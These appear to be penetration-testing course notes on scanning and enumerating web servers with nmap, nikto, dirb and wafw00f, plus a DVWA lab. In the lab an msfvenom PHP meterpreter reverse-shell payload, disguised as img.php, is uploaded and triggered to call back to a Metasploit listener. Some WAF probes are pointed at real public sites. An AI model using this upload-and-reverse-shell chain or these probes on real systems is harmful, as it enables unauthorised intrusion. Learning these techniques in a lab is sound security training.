# Module 4: Advanced Network Security Techniques

---

## 🖥️ Fingerprinting Servers

### 🔹 Port Scanning

nmap -p 80,443,8080 192.168.56.0/24

| Port | Service    |
| ---- | ---------- |
| 80   | HTTP       |
| 443  | HTTPS      |
| 8080 | HTTP Proxy |

---

### 🔹 Web Access

If port 80 is open:
http://192.168.56.101

---

### 🔹 Identify Technologies

whatweb 192.168.56.101

✔ Detects technologies like:

* Web server
* CMS
* Frameworks

---

### 🔹 OS Detection

nmap -O 192.168.56.101

---

### 🔹 Netcraft (Passive Fingerprinting)

* Visit: https://www.netcraft.com
* Enter target website
  ✔ Provides hosting & server details

---

## 🌐 Enumerating Virtual Hosts and Websites

### 🔹 Network Check

ip addr

---

### 🔹 Scan Network

nmap 192.168.56.0/24

---

### 🔹 HTTP Enumeration

nmap --script http-enum -p 80 192.168.56.101

✔ Finds:

* Hidden directories
* Login panels
* Admin pages

---

### 🔹 Directory Brute Force (DirBuster)

dirbuster

**Steps:**

* Target: http://192.168.56.101
* Scan Type: List-based brute force
* Wordlist: /usr/share/wordlists/dirb/common.txt

✔ Finds hidden directories (tree view results)

---

## 🔐 Identifying Reverse Proxy & WAF

### 🔹 Reverse Proxy

A server that sits between:

* Client (Internet)
* Internal servers

✔ Used for:

* Security
* Load balancing

---

### 🔹 WAF Detection Tool

wafw00f [www.microsoft.com](http://www.microsoft.com)
wafw00f [www.google.com](http://www.google.com)

✔ Detects Web Application Firewalls (WAF)

---

## 🧩 Identifying Subsystems (WSL Setup)

### 🔹 Enable WSL (Windows)

Control Panel → Turn Windows features on/off → Enable:

* Windows Subsystem for Linux

---

### 🔹 Install Kali Linux

* Open Microsoft Store
* Search: Kali Linux
* Install

---

### 🔹 Run Kali

kali
lsb_release -a
wsl --list --verbose

---

## ⚠️ Using Components with Known Vulnerabilities (DVWA Lab)

### 🔹 Scan Target

nmap -p 80,443,8080 192.168.56.0/24

---

### 🔹 Access Web App

http://192.168.56.101

---

### 🔹 Create Payload (msfvenom)

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f raw > img.php

---

### 🔹 Start Listener (Metasploit)

msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
run

---

### 🔹 Upload Payload (DVWA)

* Go to Upload vulnerability
* Upload img.php

---

### 🔹 Trigger Payload

http://192.168.56.101/dvwa/hackable/uploads/img.php

✔ Meterpreter session will be opened

---

### 🔹 Verify Access

whoami

---

## 🕷️ Exploring Apache Server & Crawlers

### 🔹 Scan Web Ports

nmap -p 80,443,8080 192.168.56.0/24

---

### 🔹 Nikto Scan

nikto -h 192.168.56.101

✔ Identifies:

* Vulnerabilities
* Misconfigurations
* Hidden directories

---

### 🔹 Example Finding

http://192.168.56.101/doc/

✔ Public directory exposure

---

### 🔹 Directory Brute Force (Dirb)

dirb http://192.168.56.101

✔ Discovers hidden paths

---

## ✅ Key Takeaways

* Fingerprinting reveals server & technology details
* Directory enumeration exposes hidden attack surfaces
* WAF detection helps understand security layers
* Vulnerable components can lead to full system compromise
* Tools like Nikto, Dirb, and WhatWeb are essential

---
